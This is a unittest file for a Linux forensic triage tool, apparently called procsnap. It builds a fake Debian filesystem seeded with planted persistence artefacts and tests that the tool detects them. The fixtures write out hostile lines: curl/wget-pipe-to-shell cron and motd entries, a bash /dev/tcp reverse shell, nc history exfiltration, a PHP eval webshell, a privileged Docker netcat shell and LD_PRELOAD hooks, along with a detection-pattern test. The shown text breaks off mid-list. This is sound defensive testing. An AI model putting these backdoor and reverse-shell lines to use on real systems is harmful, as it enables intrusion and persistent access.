#!/usr/bin/env python3
"""
Offline regression tests for procsnap.

Builds a fake Debian root filesystem with ~30 planted persistence / tampering
artefacts, runs `procsnap.py triage --root <fixture>` against it and asserts that
every plant is detected - and that the clean baseline items are NOT flagged.
Also unit-tests the parsers and the report's escaping.

    python3 -m unittest discover -s tests -v

Needs nothing but Python 3.8+. Safe: everything happens inside a temp directory.
"""
import hashlib
import json
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
sys.path.insert(0, REPO)
import procsnap as ps          # noqa: E402
import procsnap_viz as viz     # noqa: E402

UT = struct.Struct("hi32s4s32s256shhiii4i20s")


def md5(b):
    return hashlib.md5(b).hexdigest()


def w(root, path, text="", mode=0o644, mtime=None):
    fp = os.path.join(root, path.lstrip("/"))
    os.makedirs(os.path.dirname(fp), exist_ok=True)
    data = text.encode() if isinstance(text, str) else text
    with open(fp, "wb") as fh:
        fh.write(data)
    os.chmod(fp, mode)
    if mtime:
        os.utime(fp, (mtime, mtime))
    return fp


def utmp(typ, user, host, ts, line="pts/0"):
    return UT.pack(typ, 4242, line.encode(), b"ts/0", user.encode(), host.encode(),
                   0, 0, 0, int(ts), 0, 0, 0, 0, 0, b"")


def build_fixture(root):
    """A small Debian system: some packaged (clean) files plus planted badness."""
    now = time.time()
    old = now - 90 * 86400
    ps_good = b"\x7fELF genuine ps binary"
    sshd_good = b"\x7fELF genuine sshd binary"
    pam_unix = b"\x7fELF pam_unix"

    # ---- dpkg database -----------------------------------------------------
    lists = {
        "procps": ["/usr/bin/ps"],
        "openssh-server": ["/usr/sbin/sshd", "/etc/ssh/sshd_config",
                           "/usr/lib/systemd/system/ssh.service", "/etc/pam.d/sshd"],
        "libpam-modules": ["/usr/lib/x86_64-linux-gnu/security/pam_unix.so"],
        "cron": ["/etc/crontab", "/etc/cron.daily/logrotate"],
        "base-files": ["/etc/profile", "/etc/update-motd.d/00-header", "/etc/os-release"],
        "sudo": ["/etc/sudoers", "/usr/bin/sudo"],
        "bash": ["/etc/bash.bashrc"],
    }
    for pkg, files in lists.items():
        w(root, f"/var/lib/dpkg/info/{pkg}.list", "\n".join(["/."] + files) + "\n")
    # ps on disk is TROJANED: md5sums hold the genuine digest
    w(root, "/var/lib/dpkg/info/procps.md5sums", f"{md5(ps_good)}  usr/bin/ps\n")
    ssh_unit_orig = b"[Service]\nExecStart=/usr/sbin/sshd -D\n"
    w(root, "/var/lib/dpkg/info/openssh-server.md5sums",
      f"{md5(sshd_good)}  usr/sbin/sshd\n{md5(ssh_unit_orig)}  usr/lib/systemd/system/ssh.service\n")
    w(root, "/var/lib/dpkg/info/libpam-modules.md5sums",
      f"{md5(pam_unix)}  usr/lib/x86_64-linux-gnu/security/pam_unix.so\n")
    pam_sshd_orig = md5(b"@include common-auth\n")
    sshd_cfg_orig = md5(b"PermitRootLogin yes\n")
    w(root, "/var/lib/dpkg/status",
      "Package: openssh-server\nStatus: install ok installed\nConffiles:\n"
      f" /etc/pam.d/sshd {pam_sshd_orig}\n /etc/ssh/sshd_config {sshd_cfg_orig}\n\n"
      "Package: procps\nStatus: install ok installed\n")

    w(root, "/usr/bin/ps", b"\x7fELF TROJANED ps", 0o755)                    # plant
    w(root, "/usr/sbin/sshd", sshd_good, 0o755)                              # clean
    w(root, "/usr/bin/sudo", b"\x7fELF sudo", 0o4755)                        # clean suid
    w(root, "/usr/bin/kworkerd", b"\x7fELF dropped", 0o755)                  # plant
    w(root, "/usr/lib/x86_64-linux-gnu/security/pam_unix.so", pam_unix)     # clean
    w(root, "/usr/lib/x86_64-linux-gnu/security/pam_sshlog.so", b"\x7fELF")  # plant

    w(root, "/etc/os-release", 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\nID=debian\n')
    w(root, "/etc/hostname", "fixture-web01\n")

    # ---- accounts ------------------------------------------------------------
    w(root, "/etc/passwd",
      "root:x:0:0:root:/root:/bin/bash\n"
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
      "www-data:x:33:33:www-data:/var/www:/bin/bash\n"                   # plant: shell
      "toor:x:0:0::/root:/bin/bash\n"                                    # plant: uid 0
      "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
      "backup2:$6$abc$hashinpasswd:1001:1001::/home/backup2:/bin/sh\n")  # plant: hash
    w(root, "/etc/shadow",
      "root:$6$x$y:19000:0:99999:7:::\ndaemon:*:19000:0:99999:7:::\n"
      f"www-data:$6$p$q:{int(now // 86400)}:0:99999:7:::\n"             # plant: password
      "toor:$6$t$t:19000:0:99999:7:::\nalice:$6$a$a:19000:0:99999:7:::\n"
      "backup2::19000:0:99999:7:::\n", 0o640)
    w(root, "/etc/group", "root:x:0:\nsudo:x:27:alice\ndocker:x:998:alice\nwww-data:x:33:\n"
                          "alice:x:1000:\n")
    for d in ("/root", "/home/alice", "/var/www", "/home/backup2"):
        os.makedirs(os.path.join(root, d.lstrip("/")), exist_ok=True)

    # ---- ssh -------------------------------------------------------------------
    key = "AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"
    w(root, "/var/www/.ssh/authorized_keys", f"ssh-ed25519 {key} attacker@kali\n")  # plant
    w(root, "/root/.ssh/authorized_keys", f"ssh-ed25519 {key} admin@laptop\n", mtime=old)
    w(root, "/etc/ssh/sshd_config", "PermitRootLogin yes\nPermitEmptyPasswords yes\n")

    # ---- sudo --------------------------------------------------------------------
    w(root, "/etc/sudoers", "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n"
                            "@includedir /etc/sudoers.d\n", 0o440)
    w(root, "/etc/sudoers.d/99-svc", "Defaults env_keep += \"LD_PRELOAD\"\n"
                                     "www-data ALL=(ALL) NOPASSWD: ALL\n", 0o440)   # plant

    # ---- PAM ---------------------------------------------------------------------
    w(root, "/etc/pam.d/sshd", "@include common-auth\n"
                               "auth optional pam_exec.so expose_authtok /usr/local/bin/.l\n")
    w(root, "/etc/pam.d/common-auth", "auth [success=1 default=ignore] pam_unix.so nullok\n"
                                      "auth requisite pam_deny.so\nauth required pam_permit.so\n")

    # ---- dynamic linker -----------------------------------------------------------
    w(root, "/etc/ld.so.preload", "/usr/lib/libsystemd-shared.so.6\n")             # plant
    w(root, "/usr/lib/libsystemd-shared.so.6", b"\x7fELF rootkit")
    w(root, "/etc/ld.so.conf.d/evil.conf", "/dev/shm/.lib\n")                       # plant

    # ---- cron / at ------------------------------------------------------------------
    w(root, "/etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    w(root, "/etc/cron.d/apt-sync",                                                 # plant
      "*/5 * * * * root curl -fsSL http://203.0.113.50/x.sh | sh\n")
    w(root, "/var/spool/cron/crontabs/www-data", "@reboot /tmp/.ICE-unix/.s/kd\n")  # plant x2
    w(root, "/etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n", 0o755)
    w(root, "/var/spool/cron/atjobs/a0001", "#!/bin/sh\ncd /tmp\n/tmp/payload\n")    # plant

    # ---- systemd ----------------------------------------------------------------------
    w(root, "/usr/lib/systemd/system/ssh.service",                                  # plant: edited
      "[Service]\nExecStart=/usr/sbin/sshd -D\nExecStartPost=/usr/local/bin/sshd-wrap\n")
    w(root, "/etc/systemd/system/ssh.service.d/override.conf",                       # plant: drop-in
      "[Service]\nExecStart=\nExecStart=/usr/local/bin/sshd-wrap -D\n")
    w(root, "/usr/local/bin/sshd-wrap", b"#!/bin/sh\nexec /usr/sbin/sshd \"$@\"\n", 0o755)
    w(root, "/etc/cron.d/backup", "0 3 * * * root /opt/backup/run.sh --full\n", mtime=old)
    w(root, "/opt/backup/run.sh", b"#!/bin/sh\ntar czf /var/backups/x.tgz /etc\n", 0o755)
    w(root, "/etc/systemd/system/dbus-org.service",                                 # plant
      "[Service]\nExecStart=/dev/shm/dbus-org --daemon\n[Install]\nWantedBy=multi-user.target\n")
    w(root, "/home/alice/.config/systemd/user/sync.service",                        # plant
      "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.7/443 0>&1'\n")
    w(root, "/etc/systemd/system-generators/net-gen", "#!/bin/sh\n", 0o755)        # plant

    # ---- other autostarts ---------------------------------------------------------------
    w(root, "/etc/rc.local", "#!/bin/sh\nnohup /var/tmp/.x/agent &\nexit 0\n", 0o755)   # plant
    w(root, "/etc/update-motd.d/00-header", "#!/bin/sh\nuname -a\n", 0o755)
    w(root, "/etc/update-motd.d/99-stats", "#!/bin/sh\n(wget -qO- http://203.0.113.9/m | sh) &\n",
      0o755)                                                                         # plant
    w(root, "/etc/apt/apt.conf.d/00-update",                                         # plant
      'APT::Update::Pre-Invoke {"nohup /usr/bin/kworkerd >/dev/null 2>&1 &"};\n')
    w(root, "/etc/udev/rules.d/75-net.rules",                                        # plant
      'ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/bin/kworkerd"\n')
    w(root, "/etc/modprobe.d/fs.conf", "install ext4 /sbin/insmod /opt/.k/hide.ko; "
                                       "/sbin/modprobe --ignore-install ext4\n")      # plant
    w(root, "/etc/modules-load.d/net.conf", "diamorphine\n")                         # plant

    # ---- shell init + history -------------------------------------------------------------
    w(root, "/etc/profile", "# system profile\nexport PATH\n")
    w(root, "/etc/bash.bashrc", "alias ls='ls --color=auto'\n")                      # clean
    w(root, "/home/alice/.bashrc", "alias ls='ls --color=auto'\n"
                                   "alias sudo='/home/alice/.cache/s'\n")            # plant
    w(root, "/etc/profile.d/proxy.sh", "export PROMPT_COMMAND='history -a >(nc 203.0.113.4 80)'\n")
    os.symlink("/dev/null", os.path.join(root, "root/.bash_history"))                # plant
    w(root, "/home/alice/.bash_history", "ls\nwget http://203.0.113.9/k -O /tmp/k; chmod +x /tmp/k\n"
                                         "echo YmFzaAo= | base64 -d | sh\n")         # plant

    # ---- logins -----------------------------------------------------------------------------
    t0 = now - 3600
    btmp = b"".join(utmp(6, "root", "203.0.113.66", t0 + i) for i in range(25))
    wtmp = utmp(2, "reboot", "6.1.0", t0 - 100, "~") + \
        utmp(7, "root", "203.0.113.66", t0 + 60, "pts/1") + \
        utmp(7, "www-data", "198.51.100.3", t0 + 90, "pts/2") + \
        utmp(7, "alice", "10.0.0.5", t0 + 120, "pts/3") + \
        utmp(8, "", "", t0 + 120 + 5025, "pts/3")          # alice logs out after 1h 23m 45s
    w(root, "/var/log/btmp", btmp)
    w(root, "/var/log/wtmp", wtmp)
    w(root, "/var/log/auth.log",
      "2026-10-01T10:00:00 web01 useradd[100]: new user: name=toor, UID=0, GID=0, home=/root\n"
      "2026-10-01T10:00:05 web01 usermod[101]: add 'www-data' to group 'sudo'\n"
      "2026-10-01T10:00:09 web01 sshd[102]: Accepted password for root from 203.0.113.66 port 5 ssh2\n")
    w(root, "/var/log/syslog", "")                                                   # plant (empty)

    # ---- filesystem -----------------------------------------------------------------------------
    w(root, "/tmp/.ICE-unix/.s/kd", b"\x7fELF payload", 0o755)
    w(root, "/dev/shm/dbus-org", b"\x7fELF implant", 0o755)                          # plant
    w(root, "/var/tmp/.x/agent", b"#!/bin/sh\nwhile :; do sleep 60; done\n", 0o755)
    os.makedirs(os.path.join(root, "tmp/..."), exist_ok=True)                        # plant
    w(root, "/tmp/.../rootshell", b"\x7fELF bash copy", 0o4755)                      # plant suid
    w(root, "/var/www/html/index.php", "<?php echo 'hello'; ?>\n")
    w(root, "/var/www/html/uploads/thumb.php",                                       # plant
      "<?php @eval(base64_decode($_POST['z'])); ?>\n")
    # ---- Q4: other attacker persistence ----------------------------------------------------
    w(root, "/root/.ssh/rc", "curl -s http://203.0.113.9/r | sh\n")                       # ssh rc
    with open(os.path.join(root, "etc/ssh/sshd_config"), "a") as fh:
        fh.write("TrustedUserCAKeys /etc/ssh/ca.pub\nPermitUserEnvironment yes\n")
    w(root, "/home/alice/.ssh/environment", "LD_PRELOAD=/tmp/.l.so\n")
    w(root, "/root/.ssh/authorized_keys",
      f'environment="LD_PRELOAD=/tmp/x.so" ssh-ed25519 {key} admin@laptop\n', mtime=old)
    w(root, "/etc/logrotate.d/nginx2", "/var/log/x.log {\n  daily\n  postrotate\n"
                                        "    /var/tmp/.x/agent\n  endscript\n}\n")
    w(root, "/usr/lib/python3/dist-packages/zz-sys.pth",
      "import base64,os;exec(base64.b64decode('cHJpbnQoMSk='))\n")
    w(root, "/usr/lib/python3/dist-packages/distutils-precedence.pth",                  # benign
      "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
      "enabled and __import__('_distutils_hack').add_shim();\n")
    w(root, "/home/alice/.gitconfig", "[core]\n\tfsmonitor = /home/alice/.cache/fsm\n")
    w(root, "/etc/nsswitch.conf", "passwd: files evil\ngroup: files\nhosts: files dns\n")
    w(root, "/usr/lib/x86_64-linux-gnu/libnss_evil.so.2", b"\x7fELF nss")
    w(root, "/etc/sudo.conf", "Plugin sudoers_policy sudoers.so\n"
                              "Plugin evil_io /usr/lib/x86_64-linux-gnu/evil_io.so\n")
    w(root, "/usr/lib/x86_64-linux-gnu/evil_io.so", b"\x7fELF sudo plugin")
    w(root, "/etc/polkit-1/rules.d/49-nopasswd.rules",
      "polkit.addRule(function(a, s) { return polkit.Result.YES; });\n")
    w(root, "/etc/apache2/mods-enabled/backdoor.load",
      "LoadModule backdoor_module /usr/lib/apache2/modules/mod_backdoor.so\n")
    w(root, "/usr/lib/apache2/modules/mod_backdoor.so", b"\x7fELF apache module")
    w(root, "/var/www/html/.user.ini", "auto_prepend_file=/var/www/html/uploads/thumb.php\n")
    w(root, "/usr/lib/x86_64-linux-gnu/libprocesshider.so", b"\x7fELF hider")
    w(root, "/usr/local/bin/sudo", b"#!/bin/sh\n# steals passwords\nexec /usr/bin/sudo \"$@\"\n", 0o755)
    w(root, "/etc/default/grub", 'GRUB_CMDLINE_LINUX="quiet init=/usr/local/bin/sysinit"\n')
    w(root, "/etc/initramfs-tools/hooks/netcfg", "#!/bin/sh\ncopy_exec /usr/local/bin/sysinit\n", 0o755)
    w(root, "/var/lib/systemd/linger/alice", "")
    w(root, "/etc/systemd/system.conf.d/env.conf",
      "[Manager]\nDefaultEnvironment=LD_PRELOAD=/usr/lib/libsystemd-shared.so.6\n")
    w(root, "/etc/anacrontab", "SHELL=/bin/sh\n1\t5\tcron.daily2\t/var/tmp/.x/agent\n")
    w(root, "/etc/incron.d/watch", "/etc/passwd IN_MODIFY /var/tmp/.x/agent\n")
    w(root, "/etc/hosts.allow", "sshd: ALL : spawn (/var/tmp/.x/agent &)\n")
    w(root, "/etc/dpkg/dpkg.cfg.d/zz-hook", "post-invoke=/var/tmp/.x/agent\n")
    w(root, "/etc/skel/.bashrc", "alias sudo='/tmp/.s'\n")
    cid = "c0ffee" + "0" * 58
    w(root, f"/var/lib/docker/containers/{cid}/config.v2.json", json.dumps(
        {"Name": "/sys-monitor", "Config": {"Image": "alpine:3", "Cmd": ["sh", "-c", "nc 203.0.113.9 4444 -e sh"]},
         "State": {"Running": True}}))
    w(root, f"/var/lib/docker/containers/{cid}/hostconfig.json", json.dumps(
        {"Privileged": True, "RestartPolicy": {"Name": "always"}, "Binds": ["/:/host"],
         "PidMode": "host"}))
    return root


EXPECT = {
    # check id: substring that must appear in at least one finding title of that check
    "dpkg-mismatch": "/usr/bin/ps",
    "bin-unpackaged": "kworkerd",
    "pam-module-unpackaged": "pam_sshlog.so",
    "pam-exec": "pam_exec",
    "uid0-account": "toor",
    "passwd-hash": "backup2",
    "empty-password": "backup2",
    "service-account-shell": "www-data",
    "root-equivalent-group": "docker",
    "ssh-key-nologin-user": None,          # www-data has /bin/bash -> must NOT fire
    "sshd-config": "Empty passwords",
    "sudo-env-keep-ld": "LD_PRELOAD",
    "sudo-nopasswd-all": "www-data",
    "ld-so-preload": "libsystemd-shared",
    "ld-so-conf-ww": "/dev/shm/.lib",
    "cron-entry": "curl",
    "cron-service-account": "www-data",
    "at-job": "a0001",
    "systemd-exec": "dbus-org",
    "systemd-generator": "net-gen",
    "rc-local": "rc.local",
    "motd-script": "99-stats",
    "apt-hook": "00-update",
    "udev-rule": "75-net.rules",
    "modprobe-install": "ext4",
    "rootkit-autoload": "diamorphine",
    "shell-init": "alice/.bashrc",
    "history-devnull": "/root/.bash_history",
    "history-suspicious": "alice",
    "bruteforce-success": "203.0.113.66",
    "service-account-login": "www-data",
    "useradd-event": "toor",
    "privileged-group-add": "sudo",
    "log-empty": "syslog",
    "dropped-file": "dbus-org",
    "hidden-dir-tmp": "...",
    "suid-unpackaged": "rootshell",
    "webshell": "thumb.php",
    "conffile-modified": "/etc/pam.d/sshd",
    # Q4
    "ssh-rc": "/root/.ssh/rc",
    "sshd-trust": "trusts user certificates",
    "ssh-environment": "alice",
    "ssh-key-environment": "root",
    "logrotate-script": "nginx2",
    "python-startup-hook": "zz-sys.pth",
    "git-config-exec": "core.fsmonitor",
    "nss-module-unpackaged": "libnss_evil",
    "sudo-plugin-unpackaged": "evil_io.so",
    "polkit-rule": "49-nopasswd",
    "webserver-module-unpackaged": "mod_backdoor.so",
    "php-auto-prepend": ".user.ini",
    "lib-unpackaged": "libprocesshider",
    "path-shadowing": "/usr/local/bin/sudo",
    "boot-init-override": "init=/usr/local/bin/sysinit",
    "initramfs-hook": "netcfg",
    "systemd-linger": "alice",
    "systemd-env-preload": "env.conf",
    "anacron": "cron.daily2",
    "incron": "IN_MODIFY",
    "tcpwrappers-spawn": "hosts.allow",
    "dpkg-hook": "zz-hook",
    "skel-or-completion": "/etc/skel/.bashrc",
    "container-escape-autostart": "sys-monitor",
}
MUST_NOT = {
    # clean items that must stay quiet
    ("dpkg-mismatch", "/usr/sbin/sshd"), ("pam-permit-auth", "common-auth"),
    ("shell-init", "bash.bashrc"), ("suid-unpackaged", "/usr/bin/sudo"),
    ("webshell", "index.php"), ("cron-script", "logrotate"), ("motd-script", "00-header"),
    ("pam-module-unpackaged", "pam_unix.so"),
}


class FixtureTriage(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="procsnap-test-")
        cls.root = build_fixture(os.path.join(cls.tmp, "rootfs"))
        cls.case = os.path.join(cls.tmp, "case")
        p = subprocess.run([sys.executable, os.path.join(REPO, "procsnap.py"), "triage",
                            "--root", cls.root, "-o", cls.case, "-q", "--days", "30"],
                           capture_output=True, text=True, timeout=300)
        cls.stdout = p.stdout + p.stderr
        if p.returncode:
            raise RuntimeError(cls.stdout)
        with open(os.path.join(cls.case, "triage.json")) as fh:
            cls.res = json.load(fh)
        cls.by = {}
        for f in cls.res["findings"]:
            cls.by.setdefault(f["check"], []).append(f)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_every_plant_detected(self):
        missing = []
        for check, needle in EXPECT.items():
            if needle is None:
                continue
            titles = [f["title"] for f in self.by.get(check, [])]
            if not any(needle in t for t in titles):
                missing.append(f"{check} ~ {needle!r}  (got: {titles[:3]})")
        self.assertFalse(missing, "undetected plants:\n  " + "\n  ".join(missing))

    def test_clean_items_quiet(self):
        noisy = [f"{c}: {f['title']}" for c, needle in MUST_NOT for f in self.by.get(c, [])
                 if needle in f["title"]]
        self.assertFalse(noisy, "false positives:\n  " + "\n  ".join(noisy))

    def test_verdict_and_severity(self):
        self.assertEqual(self.res["verdict"]["level"], "compromised")
        self.assertEqual(self.by["dpkg-mismatch"][0]["sev"], "critical")
        self.assertEqual(self.by["uid0-account"][0]["sev"], "critical")
        self.assertEqual(self.by["ld-so-preload"][0]["sev"], "critical")
        self.assertEqual(self.by["rc-local"][0]["sev"], "high")
        self.assertEqual(self.by["useradd-event"][0]["sev"], "high")      # UID 0

    def test_offline_mode_skips_live_checks(self):
        self.assertTrue(self.res["host"]["mode"].startswith("offline"))
        for live in ("processes", "network", "kernel"):
            self.assertNotIn(live, self.res["timings"])
        self.assertEqual(self.res["errors"], [], self.res["errors"])

    def test_evidence_collected_and_hashed(self):
        ev = {e["path"]: e for e in self.res["evidence"]}
        self.assertIn("/usr/bin/ps", ev)
        e = ev["/usr/bin/ps"]
        self.assertEqual(e["sha256"], hashlib.sha256(b"\x7fELF TROJANED ps").hexdigest())
        saved = os.path.join(self.case, e["saved"])
        self.assertTrue(os.path.isfile(saved))
        self.assertFalse(os.stat(saved).st_mode & 0o111, "samples must never be executable")
        with open(os.path.join(self.case, "HASHES.txt")) as fh:
            self.assertIn(e["saved"], fh.read())

    def test_session_history_durations(self):
        rows = {r[0]: r for r in self.res["inventory"]["session_history"]["rows"]}
        self.assertEqual(rows["alice"][5], "1h 23m")          # login -> logout
        self.assertEqual(rows["alice"][6], "logout")
        self.assertEqual(rows["root"][6], "open (no logout yet)")
        self.assertIn("service-account", rows["www-data"][7])
        self.assertNotIn("sessions", self.res["inventory"])    # "now" needs a live host

    def test_nondefault_services(self):
        nd = {r[0]: dict(zip(self.res["inventory"]["services"]["cols"], r))
              for r in self.res["inventory"]["services_nondefault"]["rows"]}
        d = nd["dbus-org.service"]
        self.assertEqual(d["exec path"], "/dev/shm/dbus-org")
        self.assertEqual(d["exec sha256"], hashlib.sha256(b"\x7fELF implant").hexdigest())
        self.assertIn("ww-exec", d["flags"])
        s = nd["ssh.service"]                       # packaged but edited + drop-in override
        self.assertIn("packaged unit file modified", s["reason"])
        self.assertIn("changes ExecStart", s["reason"])
        self.assertEqual(s["exec path"], "/usr/local/bin/sshd-wrap")   # after 'ExecStart=' reset line
        self.assertTrue(self.by.get("service-unit-modified"))
        self.assertTrue(any("dbus-org" in f["title"] for f in self.by.get("service-masquerade", [])))
        allsvc = {r[0]: r for r in self.res["inventory"]["services"]["rows"]}
        self.assertNotIn("sshd", {k for k in nd if k.startswith("sshd")})
        self.assertEqual(len(allsvc), len(set(allsvc)))

    def test_nondefault_cron_with_exec_hash(self):
        cols = self.res["inventory"]["cron"]["cols"]
        rows = [dict(zip(cols, r)) for r in self.res["inventory"]["cron_nondefault"]["rows"]]
        by_cmd = {r["command"]: r for r in rows}
        kd = by_cmd["@reboot /tmp/.ICE-unix/.s/kd"] if "@reboot /tmp/.ICE-unix/.s/kd" in by_cmd \
            else next(r for r in rows if "kd" in r["command"])
        self.assertEqual(kd["exec path"], "/tmp/.ICE-unix/.s/kd")
        self.assertEqual(kd["exec sha256"], hashlib.sha256(b"\x7fELF payload").hexdigest())
        self.assertIn("user crontab", kd["reason"])
        bk = next(r for r in rows if r["source"] == "/etc/cron.d/backup")
        self.assertEqual(bk["exec path"], "/opt/backup/run.sh")
        self.assertTrue(any("/opt/backup/run.sh" in f["title"] for f in self.by["cron-nondefault"]))
        allrows = [dict(zip(cols, r)) for r in self.res["inventory"]["cron"]["rows"]]
        lr = next(r for r in allrows if r["source"] == "/etc/cron.daily/logrotate")
        self.assertEqual(lr["default"], "yes")       # packaged script, clean

    def test_baseline_db(self):
        db = ps.mkbaseline([os.path.join(self.case, "triage.json")])
        same = json.loads(json.dumps(self.res))
        self.assertEqual(ps.apply_baseline(same, db), 0)     # identical host: no findings
        changed = json.loads(json.dumps(self.res))
        svc = changed["inventory"]["services"]
        c = svc["cols"].index
        row = next(r for r in svc["rows"] if r[0] == "dbus-org.service")
        row[c("exec path")] = "/var/tmp/.x/agent"
        db["cron"] = {k: v for k, v in db["cron"].items() if "backup" not in k}
        n = ps.apply_baseline(changed, db)
        checks = {f["check"] for f in changed["findings"]}
        self.assertEqual(n, 2)
        self.assertIn("baseline-service-exec-path", checks)
        self.assertIn("baseline-new-cron", checks)

    def test_q4_severities(self):
        sev = {f["check"]: f["sev"] for f in self.res["findings"]}
        for check, want in (("nss-module-unpackaged", "critical"), ("sudo-plugin-unpackaged", "critical"),
                            ("webserver-module-unpackaged", "critical"), ("boot-init-override", "critical"),
                            ("systemd-env-preload", "critical"), ("path-shadowing", "high"),
                            ("container-escape-autostart", "high"), ("ssh-rc", "high")):
            self.assertEqual(sev.get(check), want, check)
        benign = [f for f in self.by["python-startup-hook"] if "distutils-precedence" in f["title"]]
        self.assertTrue(all(f["sev"] == "low" for f in benign), benign)

    def test_exec_targets_no_builtin_evasion(self):
        import argparse
        t = ps.Triage(argparse.Namespace(root="/", days=7, deep=False, out=None, no_collect=True,
                                         evidence_mb=1, walk_budget=1, quiet=True))
        self.assertEqual(t.exec_targets('"/usr/bin/sleep" "60"'), ["/usr/bin/sleep"])
        self.assertEqual(t.exec_targets("sleep $((RANDOM % 900)); /usr/bin/true"), ["/usr/bin/true"])

    def test_human_span(self):
        self.assertEqual(ps.human_span(5025), "1h 23m")
        self.assertEqual(ps.human_span(93784), "1d 2h 03m")
        self.assertEqual(ps.human_span(59), "0m 59s")

    def test_mitre_mapping_valid(self):
        for f in self.res["findings"]:
            for t in f["mitre"]:
                self.assertIn(t, ps.MITRE, f"{f['check']} uses unmapped {t}")

    def test_html_report_written(self):
        with open(os.path.join(self.case, "triage.html")) as fh:
            page = fh.read()
        self.assertIn("fixture-web01", page)
        self.assertNotIn("googleapis", page)

    def test_diff_against_cleaned_copy(self):
        clean = json.loads(json.dumps(self.res))
        clean["findings"] = [f for f in clean["findings"] if f["check"] != "uid0-account"]
        d = ps.triage_diff(clean, self.res)
        self.assertEqual([f["check"] for f in d["findings"]["new"]], ["uid0-account"])
        self.assertEqual(d["findings"]["gone"], [])


class Immutable(unittest.TestCase):
    """chattr +i on a persistence file must be reported (needs root + ext4/xfs/btrfs)."""

    def test_immutable_cron_file(self):
        import argparse
        tmp = tempfile.mkdtemp(prefix="procsnap-imm-")
        fp = w(tmp, "/etc/cron.d/locked", "* * * * * root /usr/bin/true\n")
        if not shutil.which("chattr"):
            shutil.rmtree(tmp, ignore_errors=True)
            self.skipTest("chattr not installed (e2fsprogs)")
        try:
            if os.geteuid() != 0 or subprocess.run(["chattr", "+i", fp],
                                                   capture_output=True).returncode:
                self.skipTest("chattr +i not possible here (needs root and a supporting filesystem)")
            t = ps.Triage(argparse.Namespace(root=tmp, days=7, deep=False, out=None,
                                             no_collect=True, evidence_mb=1, walk_budget=5,
                                             quiet=True))
            t.c_immutable()
            hits = [f for f in t.findings if f["check"] == "immutable-file"]
            self.assertEqual(len(hits), 1, hits)
            self.assertEqual(hits[0]["sev"], "high")
            self.assertIn("/etc/cron.d/locked", hits[0]["title"])
        finally:
            subprocess.run(["chattr", "-i", fp], capture_output=True)
            shutil.rmtree(tmp, ignore_errors=True)


class Units(unittest.TestCase):
    def test_xss_payload_is_inert(self):
        evil = "</script><script>alert(1)</script><!--"
        res = {"kind": "triage", "version": "x", "started": 0, "duration_s": 0,
               "host": {"hostname": evil}, "verdict": {"level": "clean", "text": evil},
               "counts": {s: 0 for s in ps.SEVERITIES}, "options": {}, "findings": [
                   {"id": "1", "sev": "high", "cat": "process", "check": "x", "title": evil,
                    "mitre": [], "why": "", "fix": "", "evidence": {"cmdline": evil}}],
               "inventory": {}, "evidence": [], "errors": [], "timings": {}, "mitre": {},
               "tactics": [], "self": {}}
        page = viz.render_triage(res)
        self.assertNotIn("<script>alert(1)", page)
        self.assertEqual(page.count("</script>"), 2)      # only our own two blocks
        self.assertIn("&lt;/script&gt;", page.split("<style>")[0])   # <title> is escaped

    def test_fill_is_single_pass(self):
        page = viz.fill("<title>__TITLE__</title><x>__DATA__</x>", {"k": "v"},
                        TITLE="evil __DATA__ __VERSION__")
        self.assertEqual(page.count('{"k":"v"}'), 1)       # data not copied into <title>
        self.assertIn("evil __DATA__ __VERSION__", page)

    def test_console_escapes_neutralised(self):
        import io
        buf = io.StringIO()
        out = ps.SafeConsole(buf)
        out.write("\x1b]0;PWNED\x07\x1b[2J ok \x1b[1;31mred\x1b[0m\n")
        s = buf.getvalue()
        self.assertNotIn("\x1b]", s)
        self.assertNotIn("\x1b[2J", s)
        self.assertNotIn("\x07", s)
        self.assertIn("\x1b[1;31mred", s)                 # our own colours survive

    def test_load_tolerates_garbage_lines(self):
        d = tempfile.mkdtemp()
        with open(os.path.join(d, "procsnap-20260101.jsonl"), "w") as fh:
            fh.write('[]\n"str"\nnull\n{"ts":"x","ev":"heartbeat"}\n{"ts":1,"ev":"conn_open","raddr":8}\n'
                     '{"ts":2,"ev":"heartbeat","n":0}\n')
        evs = list(ps.load(d))
        self.assertEqual([e["ev"] for e in evs], ["conn_open", "heartbeat"])
        viz.build(d)                                        # must not crash on raddr=8
        shutil.rmtree(d)

    def test_hex_ip(self):
        self.assertEqual(ps.hex_ip("0100007F"), "127.0.0.1")
        self.assertEqual(ps.hex_ip("0000000000000000FFFF00000100007F"), "127.0.0.1")

    def test_duration(self):
        self.assertEqual(ps.duration("10m"), 600)
        self.assertEqual(ps.duration("90"), 90)

    def test_decode_caps(self):
        raw = struct.pack("<IIIII", 0x02000001, (1 << 7) | (1 << 21), 0, 0, 0)
        self.assertEqual(ps.decode_caps(raw), ["cap_setuid", "cap_sys_admin"])

    def test_ssh_fingerprint(self):
        k = "AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"
        self.assertTrue(ps.ssh_fingerprint(k).startswith("SHA256:"))

    def test_suspect_cmd(self):
        for bad in ("curl -s http://x/y | bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
                    "echo aGk= | base64 -d", "nc -e /bin/sh 1.2.3.4 9", "./xmrig -o pool",
                    "unset HISTFILE", "chmod +x /tmp/a"):
            self.assertTrue(ps.SUSPECT_CMD.search(bad), bad)
        for ok in ("ls --color=auto", "/usr/sbin/logrotate /etc/logrotate.conf",
